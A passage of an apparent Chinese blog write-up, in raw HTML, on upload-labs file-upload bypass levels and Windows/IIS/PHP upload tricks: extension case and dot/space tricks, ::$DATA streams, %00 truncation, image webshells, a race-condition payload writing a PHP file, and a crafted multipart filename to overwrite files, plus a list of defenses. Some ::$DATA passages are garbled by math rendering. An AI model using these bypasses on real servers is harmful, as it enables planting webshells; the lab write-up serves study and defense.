class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.ini&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);//删除文件名末尾的点</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);//分割取后缀</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); //转换为小写</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);//去除字符串::<span class=\"variable\">$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); //收尾去空</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Pass05</p>\n<p>PhP 通过大小写绕过</p>\n<p>只在 Windows 下使用，因为 Windows 不区分大小写</p>\n<p>Pass06</p>\n<p>在提交时在文件末尾加空格绕过后缀检测，Windows 服务端会自动去除，但 php 可以识别空格</p>\n<p>通过抓包修改</p>\n<p>Pass07</p>\n<p>后缀加.，Windows 忽略文件后的.</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701454141-fc96f35c-12db-4bb3-a9b5-ccbc57e77c58.png\" alt=\"img\"></p>\n<p>Pass08</p>\n<p>当从 Windows shell 命令行指定创建文件时，流的完整名称为 “<strong>filename</strong>:<strong>stream name</strong>:<strong>stream type</strong>”，如示例中所示： “myfile.txt:stream1:$DATA”</p>\n<p>::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>数据流。默认数据流没有名称。对</mtext><mi>N</mi><mi>T</mi><mi>F</mi><mi>S</mi><mtext>格式下的一个文件而言，至少包含一个流，即</mtext><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mtext>流（其</mtext><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>m</mi><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mtext>为</mtext></mrow><annotation encoding=\"application/x-tex\">DATA  数据流。 默认数据流没有名称。对NTFS格式下的一个文件而言，至少包含一个流，即data流（其stream type为</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">默</span><span class=\"mord cjk_fallback\">认</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">称</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">言</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">至</span><span class=\"mord cjk_fallback\">少</span><span class=\"mord cjk_fallback\">包</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">为</span></span></span></span> DATA），data 流是文件的主流，默认的 data 流其 stream name 为空。默认一个文件如果被指定了流，而该流没有 stream type 的话会在存储时自动添加 $DATA。</p>\n<p>在 window 的时候如果文件名 + <code>&quot;::$DATA&quot;</code>  会把 <code>::$DATA</code>  之后的数据当成文件流处理，不会检测后缀名，且保持 <code>::$DATA</code>  之前的文件名</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701582526-a5e593cd-a5a6-4472-8185-b8c142d207ae.png\" alt=\"img\"></p>\n<p>php 开发模式下 php -S localhost:9090           php 版本 &lt; 7</p>\n<p>localhost:9090/web.php.  会造成任意文件下载和源码读取</p>\n<p>localhost:9090/web.PHP  源码读取</p>\n<p>Pass09</p>\n<p><code>test.php. .   </code></p>\n<p><code>test.php. .     </code>   // 最后还有一个空格</p>\n<p>trim 两次，去 dot 一次，剩下一个点绕过</p>\n<p>Pass10</p>\n<p>后缀被替换为空</p>\n<p>teat.pphphp</p>\n<p>str_ireplace 可以连续过滤多次，比如 phpphp</p>\n<p>test11</p>\n<p>%00 截断 (get 截断) 文件可控</p>\n<p>PHP 底层用 c 语言，c 语言中 \\0 是结束符</p>\n<p>在 PHP 中 get 方法使用 %00 进行截断，而 get 是 url 传参，url 解码后，%00 就是 \\0</p>\n<p>截断后原本的文件名被截断导致随机数被丢失</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$img_path = $_GET[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.$file_ext;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715548691-bb017a2c-3516-48af-ab83-13a2cf1828ca.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221025161153164.png\" alt=\"image-20221025161153164\"></p>\n<p>截断条件 PHP&lt;5.3.29 GPC 关闭</p>\n<p>php%00 截断</p>\n<p>1. 上传时路径可控，使用 00 截断</p>\n<p>2. 文件下载时，00 截断绕过白名单检查</p>\n<p>3. 文件包含时，00 截断后面限制 (主要是本地包含时)</p>\n<p>4. 其它与文件操作有关的地方都可能使用 00 截断。</p>\n<p>Pass12</p>\n<p>post 截断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641716003160-187aa0eb-ac1d-4b9d-8250-dac1ac8499aa.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715928171-812d6b71-ffa2-47ac-afab-5e5577c11eb3.png\" alt=\"img\"></p>\n<p>25 改为 00</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715981547-19efbd93-4201-4301-91e8-916dbca04d31.png\" alt=\"img\"></p>\n<p>或者将 %00urldecode</p>\n<p>Pass 13 文件包含</p>\n<p>只读前两个字节</p>\n<p>1. 上传图片码</p>\n<p>copy xxxx.jpg /b + test.php /a test1.jpg</p>\n<p>2. 文件包含，他写了一个 include.php 作为文件包含</p>\n<?php \n\ninclude demo.jpg\n\n?>\n<p>会将包含的文件当做 PHP 执行</p>\n<p>include 时文件不能可控</p>\n<p>127.0.0.1/include.php?file=./upload/1.jpg</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/*</span><br><span class=\"line\">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class=\"line\">*/</span><br><span class=\"line\">header(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">    include <span class=\"variable\">$file</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    show_source(__file__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>Pass14</p>\n<p>==Pass13</p>\n<p>Pass16</p>\n<p>重新生成文件导致木马无效</p>\n<p>通过 payload 将木马插入到没有被打乱的部分，实现木马</p>\n<p>png 和 jpg 都会有不被打乱的部分</p>\n<p>通过脚本找到没有被打乱的部分</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjY1NyN0b2MtMg==\">https://xz.aliyun.com/t/2657#toc-2</span></p>\n<p>Pass17</p>\n<p>时间竞争 文件先上传后判断，导致上传后出现，一旦出现资源占用时，rename 操作被中断，可以生成</p>\n<p>上传一下文件，通过 intruder 连续上传，web.php</p>\n<p><code>&lt;?php fputs(fopen('../haha.php','w'),'&lt;?php phpinfo(); ?&gt;');&gt;</code></p>\n<p>在访问 web.php，访问时抓包，送到 intruder，一旦访问到，则会在上级目录生成 haha.php</p>\n<p>解决：先判断，如果后缀不对别上传</p>\n<p>写到上级目录防止递归删除文件夹中全部内容，如果不是递归删除，生成在当前目录也行</p>\n<p>Pass19</p>\n<p><code>.</code>  截断</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIwMDQzMDMy\">https://blog.csdn.net/weixin_47306547/article/details/120043032</span></p>\n<h2 id=\"文件上传防御与绕过\"><a class=\"markdownIt-Anchor\" href=\"#文件上传防御与绕过\">#</a> 文件上传防御与绕过</h2>\n<blockquote>\n<p>前端验证</p>\n<p>白名单过滤后缀 .gif|.jpg|.png</p>\n<p>content-type 检测 image/jpeg  image/png  image/gif</p>\n<p>黑名单过滤：限制 php，asp，jsp，jspx</p>\n<p>exif_imagetype 文件头检测</p>\n<p>二次渲染</p>\n<p>先判断在上传</p>\n<p>随机方式重命名</p>\n<p>文件夹取消执行权限</p>\n<p>在临时文件夹解压</p>\n</blockquote>\n<blockquote>\n<p>绕过办法：</p>\n<p>1. 文件大小写绕过（Php ，PhP pHp，等）</p>\n<p>2. 黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php</p>\n<p>3. 特殊文件名绕过<br>\n 1）修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格) 由于这种命名格式在<br>\n windows 系统里是不允许的，所以在绕过上传之后 windows 系统会自动去掉。点和空格。Linux 和<br>\n Unix 中没有这个特性。<br>\n2）::$DATA (php 在 windows 的时候如果文件名 +&quot;::DATA&quot; 会把::DATA 之后的数据当作文件流处<br>\n理，不会检测后缀名，且保持 &quot;::DATA&quot; 之前的文件名，其目的就是不检查后缀名)</p>\n<p>4.0x00 截断绕过（5.2 C 语言中将 \\0 当作字符串的结尾）</p>\n<p>5.htaccess 文件攻击（结合黑名单攻击）</p>\n<p>6. 解析绕过</p>\n<p>7. 修改 content-type 字段</p>\n<p>8. 关闭浏览器 js</p>\n<p>9. 使用图片马配合文件包含</p>\n<p>10. 修改文件头</p>\n<p>JPG<br>\n <code>FF D8 FF E0 00 10 4A 46 49 46</code></p>\n<p>GIF<br>\n <code>47 49 46 38 39 61</code></p>\n<p>(相当于文本的 GIF89a)</p>\n<p>PNG<br>\n <code>89 50 4E 47</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/9113969-cf4c7c27a2bea500.png\" alt=\"img\"></p>\n</blockquote>\n<h2 id=\"phpiiswindows-文件上传\"><a class=\"markdownIt-Anchor\" href=\"#phpiiswindows-文件上传\">#</a> php+IIS+Windows 文件上传</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//U-Mail demo ...</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;filename&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[^\\w]/i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$filename</span>);  <span class=\"comment\">//过滤除了a-zA-Z0-9以外的内容</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];    <span class=\"comment\">//file中name</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;;&#x27;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$upfile</span>);   <span class=\"comment\">//过滤; 防止截断</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[^(\\w|\\:|\\$|\\.|\\&lt;|\\&gt;)]/i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$upfile</span>);   <span class=\"comment\">//只能出现a-zA-Z0-9:$.&lt;&gt;</span></span><br><span class=\"line\">    <span class=\"variable\">$tempfile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"title function_ invoke__\">get_extension</span>(<span class=\"variable\">$upfile</span>)); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;php3&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>)))&#123;   <span class=\"comment\">//过滤php35</span></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Warning ! File type error..&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;asp&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;asa&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;cer&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;cdx&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;aspx&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;htaccess&#x27;</span>) <span class=\"variable\">$ext</span> = <span class=\"string\">&#x27;file&#x27;</span>;</span><br><span class=\"line\">  <span class=\"comment\">//$savefile = &#x27;upload/&#x27;.$upfile;</span></span><br><span class=\"line\">    <span class=\"variable\">$savefile</span> = <span class=\"string\">&#x27;upload/&#x27;</span>.<span class=\"variable\">$filename</span>.<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$ext</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tempfile</span>,<span class=\"variable\">$savefile</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Success upload..path :&#x27;</span>.<span class=\"variable\">$savefile</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Upload failed..&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_extension</span>(<span class=\"params\"><span class=\"variable\">$file</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$file</span>, <span class=\"title function_ invoke__\">strrpos</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&#x27;.&#x27;</span>)+<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">  &lt;form method=<span class=\"string\">&quot;post&quot;</span> action=<span class=\"string\">&quot;upfile.php&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> value=<span class=\"string\">&quot;&quot;</span>/&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;hidden&quot;</span> name=<span class=\"string\">&quot;filename&quot;</span> value=<span class=\"string\">&quot;file&quot;</span>/&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;upload&quot;</span>/&gt;</span><br><span class=\"line\">  &lt;/form&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>前置知识 1.</p>\n<p>php 可以使用 <code>%00</code>  截断，也可以使用 <code>:</code>  截断，但：截断后文件内容是空的</p>\n<p>(我看人家说用 #? 这两个字符也能截断… 我觉得不太对)</p>\n<p>前置知识 2.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Windows</span>+<span class=\"variable constant_\">IIS</span>+<span class=\"variable constant_\">PHP</span>下</span><br><span class=\"line\">双引号(<span class=\"string\">&quot;“&quot;</span>) &lt;==&gt; 点号(<span class=\"string\">&quot;.&quot;</span>)<span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">大于符号(&quot;&gt;&quot;) &lt;==&gt; 问号(&quot;?&quot;)&#x27;</span>;</span><br><span class=\"line\">小于符号(<span class=\"string\">&quot;&lt;&quot;</span>) &lt;==&gt; 星号(<span class=\"string\">&quot;*&quot;</span>)<span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">上述是等价的，但*又可以做通配符使用，因此我们可以使用&lt;作为通配符</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"利用覆盖生成文件\"><a class=\"markdownIt-Anchor\" href=\"#利用覆盖生成文件\">#</a> 利用：覆盖生成文件</h3>\n<p>先安装 IIS 和对应的管理工具</p>\n<p>1) 首先利用冒号生成我们将要覆盖的 php 文件，这里为：bypass.php，抓包将其改为 bypass.php:jpg</p>\n<p>此时会覆盖文件，文件上传后的文件名为 bypass.php，大小为 0kb</p>\n<p>2) 利用上面的系统特性覆盖该文件</p>\n<p>从上面已经知道 &quot;&lt;&quot; 就等于 “ <code>*</code> ”, 而 &quot; <code>*</code> &quot; 代码任意字符，于是乎… 我们可以这样修改上传的文件名</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------<span class=\"title class_\">WebKitFormBoundaryaaRARrn2LBvpvcwK</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Disposition</span>: form-data; name=<span class=\"string\">&quot;file&quot;</span>; filename=<span class=\"string\">&quot;bypass.&lt;&lt;&lt;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>\n<p>此时即可覆盖 bypass.php，同时文件内容被成功写了进去，后面就可以在内容中写 php 代码</p>\n<h3 id=\"通过默认数据流上传php文件\"><a class=\"markdownIt-Anchor\" href=\"#通过默认数据流上传php文件\">#</a> 通过默认数据流上传 php 文件</h3>\n<p>抓包，修改文件名，在结尾添加::$DATA</p>\n<p>The default data stream has no name. That is, the fully qualified name for the default stream for a file called “sample.txt” is “sample.txt::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>i</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant=\"normal\">&quot;</mi></mrow><annotation encoding=\"application/x-tex\">DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">&quot;</span></span></span></span>DATA” is the stream type</p>\n<p>默认数据流没有名称。也就是说，名为 “sample.txt” 的文件的默认流的完全限定名是 “sample.txt:：<span class=\"katex\"><span 